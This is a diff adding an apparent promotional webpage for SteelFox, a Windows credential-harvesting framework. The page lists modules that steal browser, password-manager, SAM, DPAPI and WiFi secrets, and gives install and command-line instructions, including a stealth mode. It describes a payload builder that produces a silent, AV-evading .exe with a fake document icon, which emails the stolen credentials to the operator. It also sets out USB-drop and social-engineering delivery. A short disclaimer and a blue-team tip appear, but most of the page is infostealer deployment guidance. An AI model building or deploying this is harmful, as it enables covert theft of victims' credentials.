+              /><span class="font-bold text-lg">Windows Internals</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >10 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              Credential Manager, Vault, DPAPI blobs, SAM Hash dump, Autologon
+              secrets, PowerShell history, Unattended configs, RDP files,
+              Tortoise SVN.
+            </p>
+          </div>
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/powershell"
+                class="w-7 h-7 ico-color"
+              /><span class="font-bold text-lg">Sysadmin Tools</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >14 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              FileZilla, WinSCP, PuTTY, mRemoteNG, Rclone, VNC, Cyberduck, RDP
+              Connection Manager, AnyDesk, TeamViewer, WSL, IIS.
+            </p>
+          </div>
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/keepassxc"
+                class="w-7 h-7 ico-color"
+              /><span class="font-bold text-lg">Password Managers</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >4 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              KeePass, Bitwarden, 1Password, LastPass — master vaults and local
+              database paths.
+            </p>
+          </div>
+          <div class="card p-8 text-left">
+            <div class="flex items-center gap-3 mb-4">
+              <img
+                src="https://cdn.simpleicons.org/linux"
+                class="w-7 h-7 ico-color"
+              /><span class="font-bold text-lg">Reconnaissance</span
+              ><span class="ml-auto font-mono text-xs text-zinc-600"
+                >17 modules</span
+              >
+            </div>
+            <p
+              class="font-mono text-xs text-zinc-500 leading-relaxed text-left"
+            >
+              System info, running processes, installed software, security
+              software, USB history, clipboard, RDP history, scheduled tasks,
+              shared folders, Hosts file…
+            </p>
+          </div>
+        </div>
+        <!-- Tech icons strip -->
+        <div class="mt-14 border border-zinc-900 bg-zinc-950 p-8">
+          <p class="section-label mb-6 text-center">
+            Technologies targeted (sample)
+          </p>
+          <div class="flex flex-wrap justify-center gap-8">
+            <img
+              src="https://cdn.simpleicons.org/windows11"
+              class="w-9 h-9 ico-color"
+              title="Windows"
+            />
+            <img
+              src="https://cdn.simpleicons.org/googlechrome"
+              class="w-9 h-9 ico-color"
+              title="Chrome"
+            />
+            <img
+              src="https://cdn.simpleicons.org/firefox"
+              class="w-9 h-9 ico-color"
+              title="Firefox"
+            />
+            <img
+              src="https://cdn.simpleicons.org/discord"
+              class="w-9 h-9 ico-color"
+              title="Discord"
+            />
+            <img
+              src="https://cdn.simpleicons.org/docker"
+              class="w-9 h-9 ico-color"
+              title="Docker"
+            />
+            <img
+              src="https://cdn.simpleicons.org/steam"
+              class="w-9 h-9 ico-color"
+              title="Steam"
+            />
+            <img
+              src="https://cdn.simpleicons.org/telegram"
+              class="w-9 h-9 ico-color"
+              title="Telegram"
+            />
+            <img
+              src="https://cdn.simpleicons.org/bitwarden"
+              class="w-9 h-9 ico-color"
+              title="Bitwarden"
+            />
+            <img
+              src="https://cdn.simpleicons.org/keepassxc"
+              class="w-9 h-9 ico-color"
+              title="KeePass"
+            />
+            <img
+              src="https://cdn.simpleicons.org/amazonaws"
+              class="w-9 h-9 ico-color"
+              title="AWS"
+            />
+            <img
+              src="https://cdn.simpleicons.org/github"
+              class="w-9 h-9 ico-color"
+              title="GitHub"
+            />
+            <img
+              src="https://cdn.simpleicons.org/mysql"
+              class="w-9 h-9 ico-color"
+              title="MySQL"
+            />
+            <img
+              src="https://cdn.simpleicons.org/openvpn"
+              class="w-9 h-9 ico-color"
+              title="OpenVPN"
+            />
+            <img
+              src="https://cdn.simpleicons.org/outlook"
+              class="w-9 h-9 ico-color"
+              title="Outlook"
+            />
+            <img
+              src="https://cdn.simpleicons.org/visualstudiocode"
+              class="w-9 h-9 ico-color"
+              title="VS Code"
+            />
+            <img
+              src="https://cdn.simpleicons.org/bitcoin"
+              class="w-9 h-9 ico-color"
+              title="Bitcoin"
+            />
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════════════ INSTALLATION ══════════════════ -->
+    <section id="install" class="py-28 border-b border-zinc-900">
+      <div class="max-w-7xl mx-auto px-6">
+        <p class="section-label mb-4">Installation</p>
+        <h2 class="text-4xl font-black uppercase tracking-tighter mb-4">
+          Get Up & Running
+        </h2>
+        <p class="font-mono text-sm text-zinc-500 mb-14 max-w-2xl">
+          Three ways to run SteelFox on Windows. Choose the one that fits your
+          context.
+        </p>
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+          <!-- Option 1: pip -->
+          <div class="card p-8 flex flex-col">
+            <div
+              class="font-mono text-[10px] text-zinc-600 tracking-widest uppercase mb-3"
+            >
+              Option 01 / Recommended
+            </div>
+            <h3 class="text-xl font-bold mb-5">pip install</h3>
+            <div class="codebox p-5 rounded-none flex-1 text-xs">
+              <span class="c"># Clone the repo</span><br />
+              git clone https://github.com/<br />&nbsp;&nbsp;Tiger-Foxx/fox-steel.git<br />
+              cd fox-steel<br /><br />
+              <span class="c"># Core install (Windows runtime)</span><br />
+              pip install .<br /><br />
+              <span class="c"># With builder (generates .exe)</span><br />
+              pip install ".[builder]"<br /><br />
+              <span class="c"># Everything</span><br />
+              pip install ".[all]"
+            </div>
+            <div class="mt-5 codebox p-4 text-xs">
+              <span class="c"># Run after install</span><br />
+              steelfox all -oH<br />
+              steelfox browsers<br />
+              steelfox --list-modules
+            </div>
+          </div>
+          <!-- Option 2: manual -->
+          <div class="card p-8 flex flex-col">
+            <div
+              class="font-mono text-[10px] text-zinc-600 tracking-widest uppercase mb-3"
+            >
+              Option 02 / Manual
+            </div>
+            <h3 class="text-xl font-bold mb-5">requirements.txt</h3>
+            <div class="codebox p-5 flex-1 text-xs">
+              git clone https://github.com/<br />&nbsp;&nbsp;Tiger-Foxx/fox-steel.git<br />
+              cd fox-steel<br /><br />
+              pip install -r requirements.txt<br /><br />
+              <span class="c"># Run directly</span><br />
+              python steelfox.py --help<br />
+              python steelfox.py all -oH<br />
+              python steelfox.py browsers -q
+            </div>
+            <p class="font-mono text-xs text-zinc-600 mt-5">
+              Core deps: pycryptodome ≥ 3.19, pyasn1 ≥ 0.5. Builder adds Pillow
+              + PyInstaller.
+            </p>
+          </div>
+          <!-- Option 3: exe -->
+          <div class="card p-8 flex flex-col border-white/5">
+            <div
+              class="font-mono text-[10px] text-zinc-600 tracking-widest uppercase mb-3"
+            >
+              Option 03 / No Python
+            </div>
+            <h3 class="text-xl font-bold mb-5">Standalone .exe</h3>
+            <p class="font-mono text-xs text-zinc-500 mb-6 leading-relaxed">
+              No Python required. Download the pre-built binary from the
+              Releases page and run it directly from PowerShell.
+            </p>
+            <div class="codebox p-5 text-xs mb-6">
+              <span class="c"># PowerShell</span><br />
+              .\steelfox_console.exe all -oH<br />
+              .\steelfox_console.exe browsers<br />
+              .\steelfox_console.exe --help
+            </div>
+            <div
+              class="border border-zinc-800 bg-zinc-950 p-4 text-xs font-mono text-zinc-500 mb-auto"
+            >
+              ⚠ AV Note: Security tools may flag this binary. Add it to your AV
+              exclusions or run in a controlled environment. This is expected
+              behavior for credential auditing tools.
+            </div>
+            <a
+              href="https://github.com/Tiger-Foxx/fox-steel/releases"
+              target="_blank"
+              class="btn btn-white mt-6 w-full justify-center"
+            >
+              <svg
+                class="w-4 h-4"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                viewBox="0 0 24 24"
+              >
+                <path
+                  stroke-linecap="square"
+                  d="M4 16v2a2 2 0 002 2h12a2 2 0 002-2v-2M7 10l5 5 5-5M12 3v12"
+                />
+              </svg>
+              Download Latest Release
+            </a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════════════ CLI USAGE ══════════════════ -->
+    <section class="py-28 border-b border-zinc-900 bg-zinc-950">
+      <div class="max-w-7xl mx-auto px-6">
+        <p class="section-label mb-4">Command Line Interface</p>
+        <h2 class="text-4xl font-black uppercase tracking-tighter mb-14">
+          The Terminal is Your Weapon
+        </h2>
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
+          <div>
+            <div class="shot-wrap border border-zinc-800">
+              <img
+                src="asset_site/screen-shoot-command-line-interface.png"
+                alt="SteelFox CLI"
+                class="w-full block"
+              />
+              <div class="shot-cap">
+                <p class="font-mono text-xs text-white">
+                  SteelFox banner + live progress during a full sweep.
+                </p>
+              </div>
+            </div>
+          </div>
+          <div class="space-y-6">
+            <p class="font-mono text-sm text-zinc-400 leading-relaxed">
+              Once installed, every operation is driven by a single command.
+              Target specific categories, control verbosity, choose your output
+              format.
+            </p>
+            <div class="codebox p-6 text-xs space-y-1">
+              <div><span class="c"># Full scan, HTML report</span></div>
+              <div>steelfox all -oH</div>
+              <div class="pt-2">
+                <span class="c"># Specific category only</span>
+              </div>
+              <div>steelfox browsers</div>
+              <div>steelfox reconnaissance</div>
+              <div>steelfox windows</div>
+              <div class="pt-2">
+                <span class="c"># Output to folder, all formats</span>
+              </div>
+              <div>steelfox all -oA -output .\loot</div>
+              <div class="pt-2">
+                <span class="c"># Silent — no console, stealth mode</span>
+              </div>
+              <div>steelfox all --stealth -oH</div>
+              <div class="pt-2">
+                <span class="c"># Supply master password</span>
+              </div>
+              <div>steelfox all --password "MyKeePass"</div>
+            </div>
+            <!-- CLI flags table -->
+            <div
+              class="border border-zinc-900 divide-y divide-zinc-900 text-xs font-mono"
+            >
+              <div
+                class="grid grid-cols-2 px-4 py-2 bg-zinc-950 text-zinc-600 uppercase tracking-widest text-[10px]"
+              >
+                <span>Flag</span><span>Effect</span>
+              </div>
+              <div class="grid grid-cols-2 px-4 py-2">
+                <span class="text-zinc-300">-oH</span
+                ><span class="text-zinc-500">HTML dark dashboard</span>
+              </div>
+              <div class="grid grid-cols-2 px-4 py-2">
+                <span class="text-zinc-300">-oJ</span
+                ><span class="text-zinc-500">JSON structured output</span>
+              </div>
+              <div class="grid grid-cols-2 px-4 py-2">
+                <span class="text-zinc-300">-oN</span
+                ><span class="text-zinc-500">Plaintext TXT report</span>
+              </div>
+              <div class="grid grid-cols-2 px-4 py-2">
+                <span class="text-zinc-300">-oA</span
+                ><span class="text-zinc-500">All 3 formats at once</span>
+              </div>
+              <div class="grid grid-cols-2 px-4 py-2">
+                <span class="text-zinc-300">-q</span
+                ><span class="text-zinc-500">Quiet (no banner)</span>
+              </div>
+              <div class="grid grid-cols-2 px-4 py-2">
+                <span class="text-zinc-300">--stealth</span
+                ><span class="text-zinc-500">No console window</span>
+              </div>
+              <div class="grid grid-cols-2 px-4 py-2">
+                <span class="text-zinc-300">-v / -vv</span
+                ><span class="text-zinc-500">Verbose / debug</span>
+              </div>
+              <div class="grid grid-cols-2 px-4 py-2">
+                <span class="text-zinc-300">--list-modules</span
+                ><span class="text-zinc-500">List all modules</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════════════ BUILDER ══════════════════ -->
+    <section id="builder" class="py-28 border-b border-zinc-900">
+      <div class="max-w-7xl mx-auto px-6">
+        <p class="section-label mb-4">Payload Builder</p>
+        <h2 class="text-4xl font-black uppercase tracking-tighter mb-4">
+          Forge Your Payload
+        </h2>
+        <p class="font-mono text-sm text-zinc-500 mb-16 max-w-2xl">
+          The Builder packages the entire SteelFox engine into a self-contained
+          .exe with embedded email reporting. No Python on the target. Drop it,
+          run it, receive the loot.
+        </p>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-16 items-start mb-20">
+          <div>
+            <h3 class="text-2xl font-bold mb-6">How It Works</h3>
+            <div class="space-y-4 font-mono text-sm text-zinc-400">
+              <div class="flex gap-4 items-start p-4 border border-zinc-900">
+                <span class="text-white font-bold text-xl mr-2">1.</span>
+                <div>
+                  <p class="text-white mb-1">Provide SMTP credentials</p>
+                  <p class="text-zinc-500 text-xs">
+                    Your Gmail sender address + App Password (16-char code, not
+                    your Gmail password) and a recipient email.
+                  </p>
+                </div>
+              </div>
+              <div class="flex gap-4 items-start p-4 border border-zinc-900">
+                <span class="text-white font-bold text-xl mr-2">2.</span>
+                <div>
+                  <p class="text-white mb-1">Builder compiles the payload</p>
+                  <p class="text-zinc-500 text-xs">
+                    PyInstaller packages the engine + your encrypted SMTP config
+                    into a single .exe. The package gets renamed for AV evasion.
+                  </p>
+                </div>
+              </div>
+              <div class="flex gap-4 items-start p-4 border border-zinc-900">
+                <span class="text-white font-bold text-xl mr-2">3.</span>
+                <div>
+                  <p class="text-white mb-1">Target executes the file</p>
+                  <p class="text-zinc-500 text-xs">
+                    No window, no console. Runs in background. Sweeps all
+                    credentials. Generates HTML report.
+                  </p>
+                </div>
+              </div>
+              <div class="flex gap-4 items-start p-4 border border-zinc-900">
+                <span class="text-white font-bold text-xl mr-2">4.</span>
+                <div>
+                  <p class="text-white mb-1">Report lands in your inbox</p>
+                  <p class="text-zinc-500 text-xs">
+                    The full HTML dashboard is emailed to your target address
+                    automatically via SMTP/TLS. A local cache is also saved to
+                    %TEMP%.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div>
+            <div class="shot-wrap border border-zinc-800 mb-6">
+              <img
+                src="asset_site/screen-shoot.png"
+                alt="SteelFox Builder GUI"
+                class="w-full block"
+              />
+              <div class="shot-cap">
+                <span class="font-mono text-xs text-white"
+                  >SteelFox Builder GUI — Windows only.</span
+                >
+              </div>
+            </div>
+            <div class="grid grid-cols-2 gap-4">
+              <div class="card p-5 flex flex-col gap-2">
+                <span
+                  class="font-mono text-[10px] text-zinc-600 uppercase tracking-widest"
+                  >builder.py</span
+                >
+                <span class="text-sm font-bold">GUI (Tkinter)</span>
+                <span class="font-mono text-xs text-zinc-500"
+                  >Windows only. Visual form. Easiest for non-CLI users.</span
+                >
+              </div>
+              <div class="card p-5 flex flex-col gap-2">
+                <span
+                  class="font-mono text-[10px] text-zinc-600 uppercase tracking-widest"
+                  >builder_cli.py</span
+                >
+                <span class="text-sm font-bold">Headless CLI</span>
+                <span class="font-mono text-xs text-zinc-500"
+                  >Windows, Linux (via Wine) or CI. No GUI needed.</span
+                >
+              </div>
+            </div>
+            <div class="mt-6 codebox p-5 text-xs">
+              <span class="c"># Headless CLI builder</span><br />
+              python builder_cli.py \<br />
+              &nbsp;&nbsp;--receiver you@gmail.com \<br />
+              &nbsp;&nbsp;--sender&nbsp;&nbsp; you@gmail.com \<br />
+              &nbsp;&nbsp;--password "abcd efgh ijkl mnop" \<br />
+              &nbsp;&nbsp;--name&nbsp;&nbsp;&nbsp;&nbsp; SysHealthCheck \<br />
+              &nbsp;&nbsp;--output&nbsp;&nbsp; ./dist
+            </div>
+          </div>
+        </div>
+
+        <!-- Deployment vectors -->
+        <h3 class="text-2xl font-black uppercase tracking-tighter mb-8">
+          Deployment Vectors
+        </h3>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+          <div class="card overflow-hidden">
+            <div class="h-56 overflow-hidden border-b border-zinc-900">
+              <img
+                src="asset_site/usb-acces-image-of-usb-key-on-computer.png"
+                class="w-full h-full object-cover grayscale hover:grayscale-0 hover:scale-105 transition duration-700"
+              />
+            </div>
+            <div class="p-8">
+              <h4 class="font-bold text-xl mb-3 uppercase tracking-wide">
+                Physical Drop (USB)
+              </h4>
+              <p class="font-mono text-xs text-zinc-500 leading-relaxed">
+                Physical access to an unlocked machine. Plugin the USB stick,
+                execute the payload. SteelFox sweeps the system in under 60
+                seconds and drops the HTML report back on the USB. No traces.
+                You walk away with the credentials.
+              </p>
+            </div>
+          </div>
+          <div class="card overflow-hidden">
+            <div
+              class="h-56 bg-zinc-950 flex items-center justify-center border-b border-zinc-900 p-10"
+            >
+              <img
+                src="asset_site/example-of-executable-file-named-homework-and-hav-pdf-icon.png"
+                class="max-h-full drop-shadow-2xl"
+              />
+            </div>
+            <div class="p-8">
+              <h4 class="font-bold text-xl mb-3 uppercase tracking-wide">
+                Remote / Social Engineering
+              </h4>
+              <p class="font-mono text-xs text-zinc-500 leading-relaxed">
+                Deliver the payload remotely. The builder lets you set a custom
+                icon (word doc, PDF…). When run by the target, it operates
+                silently, exfiltrates all data, and sends the full HTML report
+                to your inbox via SMTP. Zero interaction required after drop.
+              </p>
+            </div>
+          </div>
+        </div>
+        <div class="mt-8 p-6 border border-yellow-900/40 bg-yellow-900/10">
+          <h4
+            class="font-mono text-yellow-400 text-sm uppercase tracking-widest mb-3"
+          >
+            🛡 Blue Team — Defensive Advice
+          </h4>
+          <p class="font-mono text-xs text-zinc-400 leading-relaxed">
+            Windows hides file extensions by default. A malicious
+            <code class="text-white">invoice.pdf.exe</code> with a PDF icon
+            appears as <code class="text-white">invoice.pdf</code>.
+            <strong>Enable "Show file name extensions"</strong> in Windows
+            Explorer to see the true extension of every file. This simple
+            setting prevents the vast majority of icon-spoofing attacks.
+          </p>
+        </div>
+
+        <!-- Linux builders -->
+        <div class="mt-12">
+          <h3 class="text-xl font-bold mb-6 uppercase tracking-tight">
+            Building on Linux
+          </h3>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+            <div class="card p-8">
+              <div
+                class="font-mono text-[10px] text-zinc-600 uppercase tracking-widest mb-3"
+              >
+                Option 1 — Wine (Local)
+              </div>
+              <h4 class="font-bold mb-4">Wine + Windows Python</h4>
+              <div class="codebox p-4 text-xs">
+                sudo apt install wine<br /><br />
+                <span class="c"># Download python-3.11-amd64.exe then:</span
+                ><br />
+                wine python-3.11.exe /quiet<br />
+                wine python -m pip install pyinstaller<br />
+                wine python -m pip install -r requirements.txt<br /><br />
+                wine python builder_cli.py \<br />
+                &nbsp;&nbsp;--receiver you@gmail.com \<br />
+                &nbsp;&nbsp;--password "APP_PASS" \<br />
+                &nbsp;&nbsp;--name SysHealthCheck
+              </div>
+            </div>
+            <div class="card p-8">
+              <div
+                class="font-mono text-[10px] text-zinc-600 uppercase tracking-widest mb-3"
+              >
+                Option 2 — GitHub Actions (Remote)
+              </div>
+              <h4 class="font-bold mb-4">Automated CI/CD Pipeline</h4>
+              <p class="font-mono text-xs text-zinc-500 leading-relaxed mb-4">
+                Tag a release, push. GitHub Actions spins a Windows runner,
+                compiles the payload, and stores the .exe as a build artifact.
+                Set SF_RECEIVER, SF_SENDER, SF_PASSWORD as GitHub Secrets to
+                auto-build a configured payload too.
+              </p>
+              <div class="codebox p-4 text-xs">
+                git tag -a v1.3.1 -m "Release"<br />
+                git push origin v1.3.1
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════════════ REPORTS ══════════════════ -->
+    <section id="reports" class="py-28 border-b border-zinc-900 bg-zinc-950">
+      <div class="max-w-7xl mx-auto px-6">
+        <p class="section-label mb-4">Output & Reports</p>
+        <h2 class="text-4xl font-black uppercase tracking-tighter mb-4">
+          Intelligence, Beautifully Served
+        </h2>
+        <p class="font-mono text-sm text-zinc-500 mb-14 max-w-2xl">
+          SteelFox generates self-contained reports. The HTML dashboard works
+          fully offline in any browser, with interactive search, masked fields,
+          and click-to-reveal passwords.
+        </p>
+        <div class="grid grid-cols-1 gap-8">
+          <div class="shot-wrap border border-zinc-800">
+            <img
+              src="asset_site/screen-shoot-steel-fox-html-report.png"
+              alt="SteelFox Report Overview"
+              class="w-full block"
+            />
+            <div class="shot-cap">
+              <p class="font-bold text-white mb-1">Dashboard Overview</p>
+              <p class="font-mono text-xs text-zinc-400">
+                Hostname, scan date, KPI cards (credentials found / categories
+                scanned / users targeted). Sidebar navigation with result counts
+                per category.
+              </p>
+            </div>
+          </div>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+            <div class="shot-wrap border border-zinc-800">
+              <img
+                src="asset_site/screen-shoot-steel-fox-html-report-2-Chrome.png"
+                alt="Chrome Credentials"
+                class="w-full block"
+              />
+              <div class="shot-cap">
+                <p class="font-bold text-white mb-1">
+                  Browser Credentials — 1314 items
+                </p>
+                <p class="font-mono text-xs text-zinc-400">
+                  Each card shows source, field name, masked value, usage count.
+                  Clean 4-column grid.
+                </p>
+              </div>
+            </div>
+            <div class="shot-wrap border border-zinc-800">
+              <img
+                src="asset_site/screen-shoot-steel-fox-html-report-3-wifi-and-search.png"
+                alt="WiFi & Search"
+                class="w-full block"
+              />
+              <div class="shot-cap">
+                <p class="font-bold text-white mb-1">
+                  WiFi Networks + Global Search
+                </p>
+                <p class="font-mono text-xs text-zinc-400">
+                  SSID, cleartext password, auth type. Sidebar search filters
+                  instantly across all modules.
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- Output format table -->
+        <div
+          class="mt-10 border border-zinc-900 divide-y divide-zinc-900 text-sm font-mono"
+        >
+          <div
+            class="grid grid-cols-3 px-6 py-3 bg-zinc-950 text-zinc-600 uppercase tracking-widest text-xs"
+          >
+            <span>Format</span><span>Flag</span><span>Description</span>
+          </div>
+          <div class="grid grid-cols-3 px-6 py-4">
+            <span class="text-white">HTML</span
+            ><span class="text-zinc-400">-oH</span
+            ><span class="text-zinc-500"
+              >Dark dashboard, search, click-to-reveal, offline-capable single
+              file</span
+            >
+          </div>
+          <div class="grid grid-cols-3 px-6 py-4">
+            <span class="text-white">JSON</span
+            ><span class="text-zinc-400">-oJ</span
+            ><span class="text-zinc-500"
+              >Structured, machine-readable, ideal for automation and
+              piping</span
+            >
+          </div>
+          <div class="grid grid-cols-3 px-6 py-4">
+            <span class="text-white">TXT</span
+            ><span class="text-zinc-400">-oN</span
+            ><span class="text-zinc-500"
+              >Plaintext operator-friendly dump for quick review</span
+            >
+          </div>
+          <div class="grid grid-cols-3 px-6 py-4">
+            <span class="text-white">All</span
+            ><span class="text-zinc-400">-oA</span
+            ><span class="text-zinc-500"
+              >Generates all 3 formats simultaneously</span
+            >
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════════════ OPEN SOURCE / AUTHOR ══════════════════ -->
+    <section class="py-28 border-b border-zinc-900">
+      <div
+        class="max-w-7xl mx-auto px-6 grid grid-cols-1 lg:grid-cols-2 gap-20 items-center"
+      >
+        <div>
+          <p class="section-label mb-4">Open Source Community</p>
+          <h2 class="text-4xl font-black uppercase tracking-tighter mb-8">
+            Built in the Open. Improved Together.
+          </h2>
+          <div
+            class="space-y-5 font-mono text-sm text-zinc-400 leading-relaxed"
+          >
+            <p>
+              SteelFox is
+              <span class="text-white">fully open source</span> under the
+              LGPL-3.0 license. The entire framework — from the extraction
+              engine to the HTML report generator — is available on GitHub.
+            </p>
+            <p>
+              The module architecture is intentionally simple to extend. Drop a
+              <code class="text-zinc-200">.py</code> file in the right category
+              folder, inherit from
+              <code class="text-zinc-200">ModuleBase</code>, implement
+              <code class="text-zinc-200">run()</code> — and the framework
+              auto-discovers and loads it. Zero registration, zero
+              configuration.
+            </p>
+          </div>
+          <div class="mt-8 codebox p-6 text-xs">
+            <span class="c"># Adding a new module is this simple:</span
+            ><br /><br />
+            from steelfox.core.module_base import (<br />
+            &nbsp;&nbsp;Category, ModuleBase, ModuleMeta<br />
+            )<br /><br />
+            class MyNewModule(ModuleBase):<br />
+            &nbsp;&nbsp;meta = ModuleMeta(<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;name="My Module",<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;category=Category.BROWSERS,<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;description="Recovers creds from X",<br />
+            &nbsp;&nbsp;)<br /><br />
+            &nbsp;&nbsp;def run(self) -&gt; list[dict]:<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;# your logic here<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;return results
+          </div>
+          <div class="flex gap-4 mt-8">
+            <a
+              href="https://github.com/Tiger-Foxx/fox-steel"
+              target="_blank"
+              class="btn btn-white"
+            >
+              <img
+                src="https://cdn.simpleicons.org/github/000000"
+                class="w-4 h-4"
+              />
+              Star on GitHub
+            </a>
+            <a
+              href="https://github.com/Tiger-Foxx/fox-steel/issues"
+              target="_blank"
+              class="btn btn-outline"
+              >Open an Issue</a
+            >
+          </div>
+        </div>
+        <!-- Author card -->
+        <div class="card p-10 flex flex-col items-center text-center">
+          <img
+            src="https://avatars.githubusercontent.com/u/118616410?v=4"
+            class="w-28 h-28 rounded-full border-2 border-zinc-700 mb-6"
+            alt="Tiger-Foxx"
+          />
+          <h3 class="text-2xl font-bold mb-1">Fox</h3>
+          <a
+            href="https://github.com/Tiger-Foxx"
+            target="_blank"
+            class="font-mono text-sm text-zinc-500 hover:text-white transition mb-6"
+            >@Tiger-Foxx</a
+          >
+          <p
+            class="font-mono text-xs text-zinc-500 leading-relaxed mb-8 max-w-sm"
+          >
+            passionate about security, developer, and hacking enthusiast.
+            SteelFox is one of many tools built with precision and passion for
+            the cybersecurity community.
+          </p>
+          <div class="grid grid-cols-2 gap-4 w-full text-xs font-mono">
+            <div class="p-4 bg-zinc-950 border border-zinc-900 text-center">
+              <p class="text-white font-bold text-2xl">v1.3.1</p>
+              <p class="text-zinc-600 mt-1">Current version</p>
+            </div>
+            <div class="p-4 bg-zinc-950 border border-zinc-900 text-center">
+              <p class="text-white font-bold text-2xl">LGPL</p>
+              <p class="text-zinc-600 mt-1">License</p>
+            </div>
+          </div>
+          <a
+            href="https://github.com/Tiger-Foxx"
+            target="_blank"
+            class="btn btn-outline mt-6 w-full justify-center"
+            >View GitHub Profile</a
+          >
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════════════ DISCLAIMER ══════════════════ -->
+    <section id="disclaimer" class="py-28">
+      <div class="max-w-5xl mx-auto px-6">
+        <div class="border border-red-900/50 bg-red-950/10 p-10 lg:p-16">
+          <div class="flex items-start gap-6 mb-8">
+            <svg
+              class="w-12 h-12 text-red-500 shrink-0 mt-1"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="1.5"
+              viewBox="0 0 24 24"
+            >
+              <path
+                stroke-linecap="square"
+                d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z"
+              />
+            </svg>
+            <div>
+              <h2 class="text-3xl font-black uppercase tracking-tighter mb-2">
+                Legal Disclaimer
+              </h2>
+              <p class="font-mono text-sm text-red-400 tracking-wide">
+                Read before you use.
+              </p>
+            </div>
+          </div>
+          <div
+            class="space-y-5 font-mono text-sm text-zinc-400 leading-relaxed"
+          >
+            <p class="text-white border-l-2 border-red-500 pl-5 py-1">
+              SteelFox is designed strictly for
+              <strong
+                >educational, academic research, and authorized security
+                auditing purposes only.</strong
+              >
+            </p>
+            <p>
+              Deploying this framework against any system, network, or
+              infrastructure
+              <strong>without explicit, prior written permission</strong> from
+              the owner is illegal in most jurisdictions worldwide — including
+              but not limited to offenses under the US Computer Fraud and Abuse
+              Act, the EU Directive on Attacks Against Information Systems, and
+              equivalent local legislation.
+            </p>
+            <p>
+              You, and solely you, are responsible for any and all actions taken
+              using this software. The author and all contributors assume zero
+              liability for misuse, damage, or legal consequences arising from
+              unauthorized deployment.
+            </p>
+            <p>
+              <strong class="text-white">Antivirus Detection:</strong> Because
+              SteelFox interfaces deeply with Windows security APIs (DPAPI, SAM,
+              Credential Manager, raw Win32), EDR platforms and traditional AV
+              solutions will flag generated executables. This is standard,
+              expected behavior for security auditing tools. Always run in a
+              controlled, excluded environment during authorized engagements.
+            </p>
+            <p
+              class="text-center pt-5 border-t border-red-900/30 text-zinc-600"
+            >
+              <code
+                >// Don't be that guy. With great code comes great
+                responsibility.</code
+              >
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ══════════════════ FOOTER ══════════════════ -->
+    <footer class="border-t border-zinc-900 bg-black py-10">
+      <div
+        class="max-w-7xl mx-auto px-6 flex flex-col md:flex-row justify-between items-center gap-6 font-mono text-xs text-zinc-600 uppercase tracking-widest"
+      >
+        <div class="flex items-center gap-3">
+          <img
+            src="asset_site/logo-steel-fox-white-1.png"
+            class="h-5 opacity-40"
+          />
+          <span>SteelFox © 2026 Tiger-Foxx. LGPL-3.0.</span>
+        </div>
+        <div class="flex items-center gap-6">
+          <a
+            href="https://github.com/Tiger-Foxx/fox-steel"
+            target="_blank"
+            class="hover:text-white transition"
+            >Source</a
+          >
+          <a
+            href="https://github.com/Tiger-Foxx/fox-steel/releases"
+            target="_blank"
+            class="hover:text-white transition"
+            >Releases</a
+          >
+          <a
+            href="https://github.com/Tiger-Foxx/fox-steel/blob/main/CHANGELOG.md"
+            target="_blank"
+            class="hover:text-white transition"
+            >Changelog</a
+          >
+          <a href="#disclaimer" class="hover:text-red-400 transition">Legal</a>
+        </div>
+      </div>
+    </footer>
+  </body>
 </html>
